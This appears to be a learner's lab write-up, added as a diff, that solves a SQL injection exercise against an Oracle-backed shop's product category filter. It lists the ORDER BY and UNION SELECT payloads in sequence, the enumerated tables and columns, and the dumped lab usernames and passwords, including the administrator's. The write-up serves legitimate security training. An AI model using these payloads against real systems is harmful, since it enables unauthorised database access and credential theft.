@@ -1,0 +1,50 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category
+2. app has login feature
+3. oracle db
+
+GOAL
+1. list all tables 
+2. list all username and password
+3. login as administrator
+
+PREREQUISITE
+1. oracle information_schema
+    query all tables : all_tables
+    list cols : all_tab_columns
+    table_name : built-in for table name
+    column_name : built-in for col name
+    
+ANALYSIS
+
+1. get no of col
+    a) ' ORDER BY 1--
+        <ok>
+    b) ' ORDER BY 2--
+        <ok>
+    c) ' ORDER BY 3--
+        <internal server error>
+    total 2 cols
+2. determine data type
+    a) ' UNION SELECT 'a', NULL FROM all_tables--
+            <ok>
+    b) ' UNION SELECT NULL, 'a' FROM all_tables--
+            <ok>
+    c) ' UNION SELECT 'a', 'a' FROM all_tables--
+            <ok>
+    both cols accept string data
+3. list all tables
+    a) ' UNION SELECT table_name, NULL FROM all_tables--
+        USERS_QQQCKY
+        APP_USERS_AND_ROLES
+4. list cols from the user table
+    a) ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_QQQCKY'--
+        PASSWORD_ZNRPCH
+        USERNAME_QBGZDC
+        USERS_QHSIVM
+    USER_ASTATUS_MAP
+5. get users and password
+    a) ' UNION SELECT USERNAME_QBGZDC, PASSWORD_ZNRPCH FROM USERS_QQQCKY--
+        administrator : p5o1p34dbw6pa9ostckf
+        carlos : 45dw8jd2k5bymhk708b3
+        wiener : hbog8nqxiy6xoenbxh55
